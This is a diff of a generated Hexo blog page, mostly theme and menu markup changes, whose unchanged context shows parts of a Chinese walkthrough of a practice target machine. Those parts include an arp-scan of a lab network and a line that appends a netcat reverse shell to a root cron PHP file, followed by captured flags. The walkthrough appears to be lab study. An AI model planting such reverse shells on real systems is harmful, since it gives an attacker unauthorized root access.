@@ -34,8 +34,8 @@
     
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
-    KEEP.hexo_config = {"hostname":"cvbxy.github.io","root":"/","language":"zh-CN","path":"search.xml"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"cvbxy","author":"cvbxy","avatar":"/images/avatar.png","logo":"/images/logo.png","favicon":"/images/logo.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2023,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.0"}
+    KEEP.hexo_config = {"hostname":"cvbxy.github.io","root":"/","language":"zh-CN","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"cvbxy","author":"cvbxy","avatar":"/images/avatar.png","logo":"/images/logo.png","favicon":"/images/logo.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":false,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":false,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"mac"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2023,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.2"}
     KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
     KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
     KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
@@ -46,6 +46,8 @@
 
 <body>
 <div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
     
 
     
@@ -64,7 +66,7 @@
 <header class="header-wrapper">
 
     <div class="border-box header-content">
-        <div class="left flex-start border-box">
+        <div class="left border-box">
             
                 <a class="logo-image border-box" href="/">
                     <img src="/images/logo.png">
@@ -76,63 +78,69 @@
         </div>
 
         <div class="right border-box">
-            <div class="pc border-box">
-                <ul class="menu-list border-box">
+            <div class="pc">
+                <ul class="menu-list">
                     
                         
-                        <li class="menu-item flex-start border-box">
-                            <a class="menu-text-color border-box" href="/">
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
                                 
                                 首页
-                                
                             </a>
-                            
                         </li>
                     
                         
-                        <li class="menu-item flex-start border-box">
-                            <a class="menu-text-color border-box" href="/archives">
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
                                 
                                 归档
-                                
                             </a>
-                            
                         </li>
                     
                         
-                        <li class="menu-item flex-start border-box">
-                            <a class="menu-text-color border-box" href="/tags">
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
                                 
                                 标签
-                                
                             </a>
-                            
                         </li>
                     
                         
-                        <li class="menu-item flex-start border-box">
-                            <a class="menu-text-color border-box" href="/categories">
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
                                 
                                 分类
-                                
                             </a>
-                            
                         </li>
                     
                         
-                        <li class="menu-item flex-start border-box">
-                            <a class="menu-text-color border-box" href="/about">
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
                                 
                                 关于
-                                
                             </a>
-                            
                         </li>
                     
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas search fa-search"></i>
+                        </li>
                     
                 </ul>
             </div>
-            <div class="mobile border-box flex-start">
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
                 <div class="icon-item menu-bar">
                     <div class="menu-bar-middle"></div>
@@ -142,66 +150,41 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list border-box">
+        <ul class="drawer-menu-list">
             
                 
-                <li class="drawer-menu-item border-box not-sub-menu">
-                    <label class="drawer-menu-label border-box">
-                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
-                            
-                            首页
-                        </a>
-                        
-                    </label>
-                    
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/"
+                    >首页</a>
                 </li>
             
                 
-                <li class="drawer-menu-item border-box not-sub-menu">
-                    <label class="drawer-menu-label border-box">
-                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
-                            
-                            归档
-                        </a>
-                        
-                    </label>
-                    
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives"
+                    >归档</a>
                 </li>
             
                 
-                <li class="drawer-menu-item border-box not-sub-menu">
-                    <label class="drawer-menu-label border-box">
-                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
-                            
-                            标签
-                        </a>
-                        
-                    </label>
-                    
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags"
+                    >标签</a>
                 </li>
             
                 
-                <li class="drawer-menu-item border-box not-sub-menu">
-                    <label class="drawer-menu-label border-box">
-                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
-                            
-                            分类
-                        </a>
-                        
-                    </label>
-                    
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories"
+                    >分类</a>
                 </li>
             
                 
-                <li class="drawer-menu-item border-box not-sub-menu">
-                    <label class="drawer-menu-label border-box">
-                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
-                            
-                            关于
-                        </a>
-                        
-                    </label>
-                    
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about"
+                    >关于</a>
                 </li>
             
         </ul>
@@ -304,11 +287,10 @@
                     </div>
                 
 
-                <div class="post-content keep-markdown-body ">
+                <div class="post-content keep-markdown-body">
                     
 
-                    
-                         <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>看一下靶机在哪个ip</p>
+                    <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>看一下靶机在哪个ip</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> ⚡ root@kali  /home/cvbxy/Desktop  arp-scan -l -I eth0 </span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:d6:f1:bc, IPv4: 192.168.56.104</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:0b       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:af:e4:80       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.103  08:00:27:23:92:04       PCS Systemtechnik GmbH</span><br></pre></td></tr></table></figure>
 
 <p>访问192.168.56.103，确认为靶机</p>
@@ -385,9 +367,7 @@
 <p>直接通过root用户的定时任务反弹shell，将反弹shell语句写入cron.php</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">www-data@espo:~/html$ <span class="built_in">echo</span> <span class="string">&quot;system(&#x27;nc 192.168.56.104 5555 -c /bin/bash&#x27;);&quot;</span> &gt;&gt; cron.php</span><br><span class="line"></span><br><span class="line">┌──(cvbxy㉿kali)-[~]</span><br><span class="line">└─$ nc -lvvp 5555 -s 192.168.56.104</span><br><span class="line">root@espo:/home/mandie<span class="comment"># cat user.txt</span></span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">b462a4ac056477047a56ea23e6bbce19</span><br><span class="line">root@espo:/home/mandie<span class="comment"># cat /root/root.txt</span></span><br><span class="line"><span class="built_in">cat</span> /root/root.txt</span><br><span class="line">0f4580e1632070ea32ead6334c0527c4</span><br></pre></td></tr></table></figure>
 
-                    
                 </div>
-
                 
 
                 <div class="post-bottom-tags-and-share border-box">
@@ -452,6 +432,7 @@
             <div class="pc-post-toc right-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
+        <!-- use hexo-blog-encrypt -->
         <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96shell"><span class="nav-text">获取shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-text">方法二</span></a></li></ol></li></ol>
     </div>
 </div>
@@ -482,7 +463,13 @@
 
     
 
-    
+    <div class="count-info info-item">
+        
+
+        
+
+        
+    </div>
 
     
 </footer>
@@ -494,10 +481,7 @@
     
         <div class="post-tools right-toc">
             <div class="post-tools-container border-box">
-    <ul class="post-tools-list border-box">
-        <!-- PC encrypt again -->
-        
-
+    <ul class="tools-list border-box">
         <!-- PC TOC show toggle -->
         
             <li class="tools-item flex-center toggle-show-toc">
@@ -530,17 +514,13 @@
             <i class="fas fa-search-minus"></i>
         </li>
 
-        <!-- toggle mode -->
-        
-            <li class="tools-item tool-toggle-theme-mode flex-center">
-                <i class="fas fa-moon"></i>
-            </li>
-        
+        <li class="tools-item tool-toggle-theme-mode flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
 
         <!-- rss -->
         
 
-        <!-- to bottom -->
         <li class="tools-item tool-scroll-to-bottom flex-center">
             <i class="fas fa-arrow-down"></i>
         </li>
@@ -576,6 +556,35 @@
 
     <!-- local search -->
     
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="搜索..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
 
     <!-- tablet toc -->
     
@@ -583,6 +592,7 @@
             <div class="tablet-post-toc">
                 <div class="post-toc-wrap border-box">
     <div class="post-toc border-box">
+        <!-- use hexo-blog-encrypt -->
         <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-text">信息收集</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96shell"><span class="nav-text">获取shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-text">方法二</span></a></li></ol></li></ol>
     </div>
 </div>
@@ -594,9 +604,7 @@
 
 
 
-
-
-<!-- common js -->
+<!-- common -->
 
 <script src="/js/utils.js"></script>
 
@@ -613,17 +621,17 @@
 <script src="/js/libs/anime.min.js"></script>
 
 
-<!-- local search -->
+<!-- local-search -->
+
+    
+<script src="/js/local-search.js"></script>
+
 
 
 <!-- lazyload -->
 
 
 <div class="">
-    <!-- home page -->
-    
-
-    <!-- post page -->
     
         <!-- post-helper -->
         
